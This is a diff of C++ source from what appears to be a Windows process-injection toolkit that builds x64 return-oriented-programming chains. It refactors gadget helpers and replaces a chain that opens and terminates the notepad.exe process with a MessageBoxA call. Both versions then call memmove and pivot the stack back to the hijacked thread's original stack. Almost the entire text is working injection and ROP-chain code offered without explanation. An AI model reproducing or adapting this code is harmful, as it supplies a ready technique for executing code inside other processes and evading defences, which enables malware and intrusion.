@@ -23,6 +23,7 @@ DWORD64 GADGET_loop, GADGET_popregs, GADGET_ret, GADGET_pivot, GADGET_addrsp, GA
 DWORD64* ROP_chain;
 int rop_pos;
 DWORD64 saved_return_address;
+TStrDWORD64Map *run_params;
 
 // Functions
 typedef struct {
@@ -75,7 +76,7 @@ void SetR9(DWORD64 value)
 	ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
 }
 
-void WinapiCall(DWORD64 winapi)
+void SetApi(DWORD64 winapi)
 {
 	ROP_chain[rop_pos++] = winapi;
 	ROP_chain[rop_pos++] = GADGET_addrsp;
@@ -86,9 +87,18 @@ void WinapiCall(DWORD64 winapi)
 	ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
 }
 
-void MovRetToRax()
+void MovRetToRcx()
 {
 	ROP_chain[rop_pos++] = GADGET_xchgeaxecx;
+}
+
+void FunctionCall(DWORD64 api_func ,DWORD64 rcx, DWORD64 rdx, DWORD64 r8, DWORD64 r9)
+{
+	SetRcx(rcx);
+	SetRdx(rdx);
+	SetR8(r8);
+	SetR9(r9);
+	SetApi(api_func);
 }
 
 TEXT_SECTION_INFO GetTextSection(HMODULE mod)
@@ -218,13 +228,15 @@ DWORD FindGadgets()
 PINJECTRA_PACKET* BuildPayload(TStrDWORD64Map& runtime_parameters)
 {
 	LoadLibrary(L"gdi32.dll");
+
 	rop_pos = 0x0;
+	run_params = &runtime_parameters;
 
 	CHAR location[] = "psapi.dll";
 	DWORD locSize = strlen(location);
+
 	WCHAR terminateStr[] = L"notepad.exe";
 	DWORD terminatePid = NameToPID((WCHAR*)terminateStr);
-
 	PINJECTRA_PACKET* output = (PINJECTRA_PACKET*)malloc(1 * sizeof(PINJECTRA_PACKET));
 
 	HMODULE ntdll = GetModuleHandleA("ntdll");
@@ -234,214 +246,54 @@ PINJECTRA_PACKET* BuildPayload(TStrDWORD64Map& runtime_parameters)
 
 	ROP_chain = (DWORD64*)malloc(100 * sizeof(DWORD64));
 
-	OSVERSIONINFOEX meow;
-	meow.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
-	GetVersionOs(&meow);
+	OSVERSIONINFOEX os_Info;
+	os_Info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
+	GetVersionOs(&os_Info);
 
-	if (meow.dwMajorVersion == 10)
-	{
-		if ((runtime_parameters["tos"] + 10 * sizeof(DWORD64)) & 0xF) // force stack alignment
-			ROP_chain[rop_pos++] = GADGET_ret;
+	
+	if ((runtime_parameters["tos"] + 10 * sizeof(DWORD64)) & 0xF) // force stack alignment
+		ROP_chain[rop_pos++] = GADGET_ret;
 		
-		SetRcx(PROCESS_TERMINATE);
-		SetRdx(FALSE);
-		SetR8(terminatePid);
-		SetR9(DONT_CARE);
-		WinapiCall((DWORD64)OpenProcess);
+	FunctionCall((DWORD64)MessageBoxA, 0, 0, 0, 0);
 
-		//// Get returned handle into ECX
-		MovRetToRax();
+	//// Get returned handle into ECX
+	//MovRetToRcx();
 
-		WinapiCall((DWORD64)TerminateProcess);
-
-		SetRcx(runtime_parameters["orig_tos"]);
-
-		ROP_chain[rop_pos++] = GADGET_poprdx;
-		saved_return_address = rop_pos++; // rdx
-
-		SetR8(8);
-		SetR9(DONT_CARE);
-		WinapiCall((DWORD64)GetProcAddress(ntdll, "memmove"));
-
-		ROP_chain[rop_pos++] = GADGET_pivot;
-		ROP_chain[rop_pos++] = runtime_parameters["orig_tos"];
-
-		// Write text to stack
-		/*ROP_chain[text_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
-		strcpy((char*)&ROP_chain[rop_pos], location);
-		rop_pos += locSize;*/
-
-		// Store new TOS
-		ROP_chain[saved_return_address] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
-		ROP_chain[rop_pos++] = DONT_CARE;
-
-		// Update Runtime Parameters with ROP-specific Parameters
-		runtime_parameters["saved_return_address"] = saved_return_address;
-		runtime_parameters["GADGET_pivot"] = GADGET_pivot;
-		runtime_parameters["rop_pos"] = rop_pos;
-
-		output->buffer = ROP_chain;
-		output->buffer_size = 100 * sizeof(DWORD64); // Ignored in NQAT_WITH_MEMSET
-		output->metadata = &runtime_parameters;
-
-		return output;
-	}
-
-	else
-	{
-		if ((runtime_parameters["tos"] + 10 * sizeof(DWORD64)) & 0xF) // stack before return address of MessageBoxA is NOT aligned - force alignment
-			ROP_chain[rop_pos++] = GADGET_ret;
-
-		// Windows10 ---> r8 first type 
-		if (GADGET_popr8)
-		{
-			// Prepare registers for OpenProcess
-			ROP_chain[rop_pos++] = GADGET_poprcx;
-			ROP_chain[rop_pos++] = PROCESS_TERMINATE; // rcx
-			ROP_chain[rop_pos++] = GADGET_poprdx;
-			ROP_chain[rop_pos++] = FALSE; // rdx
-			ROP_chain[rop_pos++] = GADGET_popr8;
-			ROP_chain[rop_pos++] = terminatePid; // r8
-			ROP_chain[rop_pos++] = GADGET_poprax;
-			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
-			ROP_chain[rop_pos++] = GADGET_movsxd;
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
-		}
-
-		// Windows10 ---> r8 second type 
-		else
-		{
-			// Prepare registers for OpenProcess
-			ROP_chain[rop_pos++] = GADGET_poprcx;
-			ROP_chain[rop_pos++] = PROCESS_TERMINATE; // rcx
-			ROP_chain[rop_pos++] = GADGET_poprdx;
-			ROP_chain[rop_pos++] = FALSE; // rdx
-			ROP_chain[rop_pos++] = GADGET_poprax; // rax -> r8
-			ROP_chain[rop_pos++] = terminatePid; // rax
-			ROP_chain[rop_pos++] = GADGET_movr8deax; // r8 <-
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
-			ROP_chain[rop_pos++] = GADGET_poprax;
-			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
-			ROP_chain[rop_pos++] = GADGET_movsxd;
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
-		}
+	//SetApi((DWORD64)TerminateProcess);
 
 
-		// Call OpenProcess
-		ROP_chain[rop_pos++] = (DWORD64)OpenProcess;
-		ROP_chain[rop_pos++] = GADGET_addrsp;
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
+	// STACK FIX
+	SetRcx((*run_params)["orig_tos"]);
 
-		//// Get returned handle into ECX
-		ROP_chain[rop_pos++] = GADGET_xchgeaxecx;
+	ROP_chain[rop_pos++] = GADGET_poprdx;
+	saved_return_address = rop_pos++; // rdx
 
-		// TerminateProcess by handle
-		ROP_chain[rop_pos++] = (DWORD64)TerminateProcess;
-		ROP_chain[rop_pos++] = GADGET_addrsp;
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
+	SetR8(8);
+	SetR9(DONT_CARE);
+	SetApi((DWORD64)GetProcAddress(ntdll, "memmove"));
 
-		DWORD64 saved_return_address;
+	ROP_chain[rop_pos++] = GADGET_pivot;
+	ROP_chain[rop_pos++] = (*run_params)["orig_tos"];
 
-		// Windows10 ---> r8 first type 
-		if (GADGET_popr8)
-		{
-			// Prepare registers to memmove
-			ROP_chain[rop_pos++] = GADGET_poprcx;
-			ROP_chain[rop_pos++] = runtime_parameters["orig_tos"]; // rcx
-			ROP_chain[rop_pos++] = GADGET_poprdx;
-			saved_return_address = rop_pos++; // rdx
-			ROP_chain[rop_pos++] = GADGET_popr8;
-			ROP_chain[rop_pos++] = 8; // r8
-			ROP_chain[rop_pos++] = GADGET_poprax;
-			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
-			ROP_chain[rop_pos++] = GADGET_movsxd;
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
-		}
+	// Write text to stack
+	/*ROP_chain[text_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
+	strcpy((char*)&ROP_chain[rop_pos], location);
+	rop_pos += locSize;*/
 
-		// Windows10 ---> r8 second type 
-		else
-		{
-			// Prepare registers to memmove
-			ROP_chain[rop_pos++] = GADGET_poprcx;
-			ROP_chain[rop_pos++] = runtime_parameters["orig_tos"]; // rcx
-			ROP_chain[rop_pos++] = GADGET_poprdx;
-			saved_return_address = rop_pos++; // rdx
-			ROP_chain[rop_pos++] = GADGET_poprax; // rax -> r8
-			ROP_chain[rop_pos++] = 8; // rax
-			ROP_chain[rop_pos++] = GADGET_movr8deax; // r8 <-
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
-			ROP_chain[rop_pos++] = GADGET_poprax;
-			ROP_chain[rop_pos++] = DONT_CARE; // rax -> r9
-			ROP_chain[rop_pos++] = GADGET_movsxd;
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-			ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
-		}
+	// Store new TOS
+	ROP_chain[saved_return_address] = (*run_params)["tos"] + sizeof(DWORD64) * rop_pos;
+	ROP_chain[rop_pos++] = DONT_CARE;
 
-		// Call memmove and return to normal execution
-		ROP_chain[rop_pos++] = (DWORD64)GetProcAddress(ntdll, "memmove");
-		ROP_chain[rop_pos++] = GADGET_addrsp;
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // shadow space
-		ROP_chain[rop_pos++] = DONT_CARE; // skipped by GADGET_addrsp
-		ROP_chain[rop_pos++] = GADGET_pivot;
-		ROP_chain[rop_pos++] = runtime_parameters["orig_tos"];
+	// STACK FIX
 
-		// Write text to stack
-		/*ROP_chain[text_pos] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
-		strcpy((char*)&ROP_chain[rop_pos], location);
-		rop_pos += locSize;*/
+	// Update Runtime Parameters with ROP-specific Parameters
+	runtime_parameters["saved_return_address"] = saved_return_address;
+	runtime_parameters["GADGET_pivot"] = GADGET_pivot;
+	runtime_parameters["rop_pos"] = rop_pos;
 
-		// Store new TOS 
-		ROP_chain[saved_return_address] = runtime_parameters["tos"] + sizeof(DWORD64) * rop_pos;
-		ROP_chain[rop_pos++] = DONT_CARE;
+	output->buffer = ROP_chain;
+	output->buffer_size = 100 * sizeof(DWORD64); // Ignored in NQAT_WITH_MEMSET
+	output->metadata = &runtime_parameters;
 
-		// Update Runtime Parameters with ROP-specific Parameters
-		runtime_parameters["saved_return_address"] = saved_return_address;
-		runtime_parameters["GADGET_pivot"] = GADGET_pivot;
-		runtime_parameters["rop_pos"] = rop_pos;
-
-		output->buffer = ROP_chain;
-		output->buffer_size = 100 * sizeof(DWORD64); // Ignored in NQAT_WITH_MEMSET
-		output->metadata = &runtime_parameters;
-
-		printf("Dynamic.cpp --> rop chain built, returning\n");
-
-		return output;
-	}
-
-
-
+	return output;
 }
